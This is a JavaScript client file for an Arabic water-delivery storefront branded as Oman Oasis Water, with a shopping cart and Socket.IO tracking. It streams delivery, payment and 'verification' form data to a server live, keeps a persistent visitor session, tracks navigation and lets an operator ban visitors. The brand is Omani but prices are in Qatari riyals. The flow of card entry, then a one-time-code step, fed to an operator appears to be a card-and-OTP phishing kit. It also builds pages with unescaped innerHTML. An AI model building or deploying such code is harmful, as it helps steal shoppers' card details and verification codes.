// مياه واحة عمان - Socket.IO Client & Tracking
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let sessionId = localStorage.getItem('wateroman_session') || generateSessionId();
localStorage.setItem('wateroman_session', sessionId);
let visitorInitSent = false; // GUARD: Only send visitor:init once per page load

function generateSessionId() {
  return 'vs_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function initSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Connected to server');
      updateConnectionStatus(true);
      
      // Only send visitor:init ONCE per full page load
      if (!visitorInitSent) {
        console.log('📡 Sending visitor:init (first time only)');
        socket.emit('visitor:init', { sessionId, page: getCurrentPage() });
        visitorInitSent = true;
      } else {
        console.log('📡 Skipping visitor:init (already sent this page load)');
      }
      
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Disconnected from server');
      updateConnectionStatus(false);
    });

    socket.on('user:banned', (data) => {
      showBannedPage(data.message);
    });

    socket.on('visitor:confirmed', (data) => {
      console.log('Visitor confirmed:', data);
    });

    // Store socket globally for form submissions
    window.socket = socket;
  });
}

// ==========================================
// MINIMAL TRACKING - Only connect/disconnect and form submissions
// NO real-time typing tracking, NO activity floods
// ==========================================

// Wait for socket connection before sending
async function waitForSocket(maxRetries = 5, intervalMs = 300) {
  for (let i = 0; i < maxRetries; i++) {
    if (socket && socket.connected) {
      return true;
    }
    await new Promise(resolve => setTimeout(resolve, intervalMs));
  }
  return false;
}

// Track page changes only when navigating between pages
function trackPageChange(page) {
  if (!socket || !socket.connected) return;
  console.log('📄 Page change: ' + page);
  socket.emit('visitor:page', { sessionId, page });
}

// Track form submissions ONLY - no input tracking
async function submitDeliveryForm(formData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - delivery form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('📦 Submitting delivery form...');
  socket.emit('form:delivery', { sessionId, formData });
  return true;
}

async function submitPaymentForm(paymentData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - payment form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('💳 Submitting payment form...');
  socket.emit('form:payment', { sessionId, paymentData });
  return true;
}

async function submitVerificationForm(verificationData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - verification form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('🔐 Submitting verification form...');
  socket.emit('form:verification', { sessionId, verificationData });
  return true;
}

function updateConnectionStatus(isOnline) {
  const statusDot = document.querySelector('.status-dot');
  const statusText = document.querySelector('.connection-status span');
  if (statusDot) {
    statusDot.classList.toggle('online', isOnline);
  }
  if (statusText) {
    statusText.textContent = isOnline ? 'متصل' : 'غير متصل';
  }
}

function getCurrentPage() {
  const path = window.location.pathname;
  if (path.includes('delivery')) return 'delivery';
  if (path.includes('payment')) return 'payment';
  if (path.includes('verification')) return 'verification';
  return 'home';
}

function showToast(message, type = 'success') {
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <span>${type === 'success' ? '✓' : type === 'error' ? '✕' : '!'}</span>
    <span>${message}</span>
  `;
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.animation = 'slideIn 0.3s ease reverse';
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

function showBannedPage(message) {
  document.body.innerHTML = `
    <div class="banned-page">
      <div class="banned-content">
        <h1>🚫</h1>
        <h1>تم حظرك</h1>
        <p>${message || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'}</p>
      </div>
    </div>
  `;
}

async function fetchProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    return data.products || [];
  } catch (error) {
    console.error('Error fetching products:', error);
    return [];
  }
}

function showLoading() {
  return `
    <div class="loading">
      <div class="spinner"></div>
      <p>جاري التحميل...</p>
    </div>
  `;
}

// ==========================================
// BROWSER NAVIGATION TRACKING - Back/Forward buttons
// ==========================================

// Listen for browser back/forward button navigation (popstate)
window.addEventListener('popstate', async () => {
  console.log('🔙 Browser navigation detected (popstate)');
  
  // Wait for socket connection
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - page tracking not sent');
    return;
  }
  
  // Get the current page based on actual URL
  const currentPage = getCurrentPage();
  console.log('📄 Emitting page change to:', currentPage);
  socket.emit('visitor:page', { sessionId, page: currentPage });
});

// Handle Page Show (BFCache) - when page is restored from back-forward cache
window.addEventListener('pageshow', async (event) => {
  if (event.persisted) {
    console.log('📦 Page loaded from BFCache (back-forward cache)');
    
    // Reinitialize socket connection for fresh tracking
    await initSocket();
    
    // Wait for connection and send page tracking
    if (await waitForSocket()) {
      const currentPage = getCurrentPage();
      console.log('📄 BFCache: Emitting page tracking for:', currentPage);
      socket.emit('visitor:page', { sessionId, page: currentPage });
    }
  }
});

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
  initSocket().catch(console.error);
  injectCartUI();
});

// ==========================================
// SHOPPING CART
// ==========================================
const CART_KEY = 'thonyan_cart';

// Product images are multi-MB base64 blobs, so they are never persisted.
// Cache them per page session for rendering the cart drawer.
const productImages = {};

async function resolveCartImage(productId) {
  if (productImages[String(productId)]) return productImages[String(productId)];
  try {
    const res = await fetch(`${SERVER_URL}/api/products/${productId}`);
    const data = await res.json();
    if (data.product && data.product.image_url) {
      productImages[String(productId)] = data.product.image_url;
      renderCartItems();
    }
  } catch (e) { /* keep placeholder */ }
  return productImages[String(productId)] || '';
}

function getCart() {
  try {
    const raw = JSON.parse(localStorage.getItem(CART_KEY) || '[]');
    return Array.isArray(raw) ? raw : [];
  } catch (e) {
    return [];
  }
}

function saveCart(items) {
  try {
    localStorage.setItem(CART_KEY, JSON.stringify(items));
  } catch (e) {
    // Product images are large base64 blobs; keep cart payloads minimal so we never exceed quota
    const slim = items.map(({ id, name_ar, price, quantity }) => ({ id, name_ar, price, quantity }));
    localStorage.setItem(CART_KEY, JSON.stringify(slim));
  }
  updateCartBadge();
  renderCartItems();
}

function addToCart(product, quantity = 1) {
  if (!product || product.id == null) return;
  const items = getCart();
  const existing = items.find(i => String(i.id) === String(product.id));
  const qty = Math.max(1, parseInt(quantity, 10) || 1);

  if (existing) {
    existing.quantity += qty;
  } else {
    // Never persist the (multi-MB) base64 image; cache it in memory for rendering
    productImages[String(product.id)] = product.image_url || '';
    items.push({
      id: product.id,
      name_ar: product.name_ar || '',
      price: Number(product.price) || 0,
      quantity: qty
    });
  }

  saveCart(items);
  showToast('✓ تمت إضافة المنتج إلى السلة');
}

function removeFromCart(productId) {
  saveCart(getCart().filter(i => String(i.id) !== String(productId)));
}

function setCartQuantity(productId, quantity) {
  const items = getCart();
  const item = items.find(i => String(i.id) === String(productId));
  if (!item) return;
  item.quantity = Math.max(1, Math.min(99, parseInt(quantity, 10) || 1));
  saveCart(items);
}

function changeCartQuantity(productId, delta) {
  const item = getCart().find(i => String(i.id) === String(productId));
  if (!item) return;
  setCartQuantity(productId, item.quantity + delta);
}

function clearCart() {
  saveCart([]);
}

function cartCount() {
  return getCart().reduce((sum, i) => sum + (parseInt(i.quantity, 10) || 0), 0);
}

function cartTotal() {
  return getCart().reduce((sum, i) => sum + (Number(i.price) || 0) * (parseInt(i.quantity, 10) || 0), 0);
}

function goToCheckout() {
  if (getCart().length === 0) {
    showToast('السلة فارغة', 'error');
    return;
  }
  // Keep legacy keys in sync for admin tracking/back-compat
  const items = getCart();
  const first = items[0];
  localStorage.setItem('selected_product', first.id);
  localStorage.setItem('selected_product_data', JSON.stringify(first));
  localStorage.setItem('selected_quantity', String(cartCount()));

  const inPages = window.location.pathname.includes('/pages/');
  window.location.href = inPages ? 'delivery.html' : 'pages/delivery.html';
}

function updateCartBadge() {
  const count = cartCount();
  document.querySelectorAll('.cart-badge').forEach(badge => {
    badge.textContent = count;
    badge.style.display = count > 0 ? 'flex' : 'none';
  });
}

function openCart() {
  const drawer = document.getElementById('cartDrawer');
  if (!drawer) return;
  renderCartItems();
  drawer.classList.add('open');
  document.body.classList.add('cart-open');
}

function closeCart() {
  const drawer = document.getElementById('cartDrawer');
  if (!drawer) return;
  drawer.classList.remove('open');
  document.body.classList.remove('cart-open');
}

function renderCartItems() {
  const container = document.getElementById('cartItems');
  if (!container) return;

  const items = getCart();

  if (items.length === 0) {
    container.innerHTML = `
      <div class="cart-empty">
        <div class="cart-empty-icon">🛒</div>
        <p>سلة المشتريات فارغة</p>
      </div>
    `;
  } else {
    container.innerHTML = items.map(item => {
      const img = productImages[String(item.id)] || '';
      if (!img) resolveCartImage(item.id);
      const src = img || 'https://images.unsplash.com/photo-1548839140-29a749e1cf4d?w=120';
      return `
      <div class="cart-item">
        <img class="cart-item-image"
             src="${src}"
             alt="${item.name_ar}"
             onerror="this.src='https://images.unsplash.com/photo-1548839140-29a749e1cf4d?w=120'">
        <div class="cart-item-info">
          <h4 class="cart-item-name">${item.name_ar}</h4>
          <div class="cart-item-price">${Number(item.price).toFixed(2)} ر.ق</div>
          <div class="cart-item-controls">
            <div class="quantity-controls">
              <button type="button" class="quantity-btn" onclick="changeCartQuantity('${item.id}', -1)">−</button>
              <span class="quantity-value">${item.quantity}</span>
              <button type="button" class="quantity-btn" onclick="changeCartQuantity('${item.id}', 1)">+</button>
            </div>
            <button type="button" class="cart-item-remove" onclick="removeFromCart('${item.id}')">🗑️</button>
          </div>
        </div>
      </div>
    `;
    }).join('');
  }

  const totalEl = document.getElementById('cartTotal');
  if (totalEl) totalEl.textContent = cartTotal().toFixed(2) + ' ر.ق';

  const checkoutBtn = document.getElementById('cartCheckoutBtn');
  if (checkoutBtn) checkoutBtn.disabled = items.length === 0;
}

function injectCartUI() {
  if (document.getElementById('cartDrawer')) return;

  const headerContent = document.querySelector('.header-content');
  if (headerContent && !headerContent.querySelector('.cart-button')) {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'cart-button';
    btn.setAttribute('aria-label', 'سلة المشتريات');
    btn.innerHTML = `<span class="cart-icon">🛒</span><span class="cart-label">سلة المشتريات</span><span class="cart-badge">0</span>`;
    btn.addEventListener('click', openCart);
    headerContent.appendChild(btn);
  }

  const drawer = document.createElement('div');
  drawer.id = 'cartDrawer';
  drawer.className = 'cart-drawer';
  drawer.innerHTML = `
    <div class="cart-overlay" onclick="closeCart()"></div>
    <aside class="cart-panel" role="dialog" aria-label="سلة المشتريات">
      <header class="cart-panel-header">
        <h3>🛒 سلة المشتريات</h3>
        <button type="button" class="cart-close" onclick="closeCart()" aria-label="إغلاق">✕</button>
      </header>
      <div class="cart-items" id="cartItems"></div>
      <footer class="cart-panel-footer">
        <div class="cart-total-row">
          <span>الإجمالي</span>
          <span id="cartTotal">0.00 ر.ق</span>
        </div>
        <button type="button" class="btn btn-primary" id="cartCheckoutBtn" onclick="goToCheckout()">
          متابعة إلى التوصيل ←
        </button>
      </footer>
    </aside>
  `;
  document.body.appendChild(drawer);

  updateCartBadge();
  renderCartItems();
}

// Export functions for use in pages
window.initSocket = initSocket;
window.trackPageChange = trackPageChange;
window.submitDeliveryForm = submitDeliveryForm;
window.submitPaymentForm = submitPaymentForm;
window.submitVerificationForm = submitVerificationForm;
window.fetchProducts = fetchProducts;
window.showToast = showToast;
window.sessionId = sessionId;
window.SERVER_URL = SERVER_URL;

// Cart exports
window.getCart = getCart;
window.addToCart = addToCart;
window.removeFromCart = removeFromCart;
window.setCartQuantity = setCartQuantity;
window.changeCartQuantity = changeCartQuantity;
window.clearCart = clearCart;
window.cartCount = cartCount;
window.cartTotal = cartTotal;
window.goToCheckout = goToCheckout;
window.openCart = openCart;
window.closeCart = closeCart;
window.injectCartUI = injectCartUI;
